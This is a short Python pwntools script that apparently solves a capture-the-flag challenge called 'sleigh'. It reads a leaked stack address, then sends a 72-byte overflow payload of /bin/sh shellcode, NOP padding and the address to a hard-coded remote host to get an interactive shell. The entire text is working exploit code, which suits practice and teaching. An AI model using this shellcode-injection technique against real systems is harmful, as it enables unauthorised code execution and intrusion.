from pwn import *
import sys

elf = ELF('./sleigh')
context.update(binary=elf)

if args.LOCAL:
	p = elf.process()
else:
	host = '206.189.24.71'
	port = 32226
	p = remote(host, port)

shellcode = shellcraft.amd64.linux.sh()
shellcode = '\tadd rsp, 0x50\n' + shellcode

p.sendlineafter(b'> ', b'1')
p.recvuntil(b'[0x')
addr = p.recvuntil(b']')[:-1]
addr = int(addr.decode(), 16)

offset = 72
payload = asm(shellcode)
payload += b'\x90' * (offset - len(payload))
payload += p64(addr)

p.sendlineafter(b'> ', payload)

p.interactive()

p.close()